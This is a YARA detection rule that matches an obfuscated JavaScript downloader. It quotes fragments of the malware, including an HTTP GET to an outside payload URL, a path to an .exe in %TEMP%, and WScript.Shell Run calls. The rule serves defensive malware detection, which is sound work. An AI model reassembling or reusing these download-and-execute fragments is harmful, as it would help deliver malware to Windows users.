rule sig_20160328_18a19cdc0e48600aaf93fa01f351ebb2 {
  meta:
    description = "datamaliciousorder - file 20160328_18a19cdc0e48600aaf93fa01f351ebb2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5a3edfec856788b5f7f2db6833db339caecd31f9b26c12420ca0fadae0455598"

  strings:
    $s1  = "function Kvirwisw() {return Uyxuxuotj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"hPp0GQA5hUNg.exe\";};" fullword ascii
    $s2  = "Osntvedy[Oquyybbqt](\"GET\", \"http://purelaces.com/ny6sja\", false);" fullword ascii
    $s3  = "do {WScript[Mknpmfidm](Nirssdpd() * 11)} while (Osntvedy[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Uyxuxuotj = function Ofycdttppc() {return WScript[Kwcqamf](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Mqyto(Etxlbm, Hjfqpdbj){return Etxlbm - Hjfqpdbj;};" fullword ascii
    $s6  = "function Zquttp(Oypiovinxl){Uyxuxuotj[\"Run\"](Oypiovinxl, Txnbpguqk, Txnbpguqk);};" fullword ascii
    $s7  = "function Ghzzhnizv() {return ((Nhaeiojrjm == true) && (Nhaeiojrjm == Jqeiejvaed)) ? 1 : Txnbpguqk;};" fullword ascii
    $s8  = "function Xdtpfzmrkr(){return Kwcqamf;};" fullword ascii
    $s9  = "function Xcstoulm()" fullword ascii
    $s10 = " while (Qdybrzls){" fullword ascii
    $s11 = "function Nirssdpd(){return 22;};" fullword ascii
    $s12 = "function Xsnictut(Wnonc) {var Aqnagzqg = (1, 2, 3, 4, 5, Wnonc); return Aqnagzqg;};" fullword ascii
    $s13 = "var Iwsqny = false;" fullword ascii
    $s14 = "Nhaeiojrjm = true; " fullword ascii
    $s15 = "var Jqeiejvaed = false;" fullword ascii
    $s16 = "return Mqyto(Kbeftj, Jjnbws);" fullword ascii
    $s17 = "Jqeiejvaed = true; " fullword ascii
    $s18 = "var Nhaeiojrjm = false;" fullword ascii
    $s19 = "var Jchfqior = new this[\"Date\"]();" fullword ascii
    $s20 = "function Qrzuqugmeg(){return Zohphuule;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}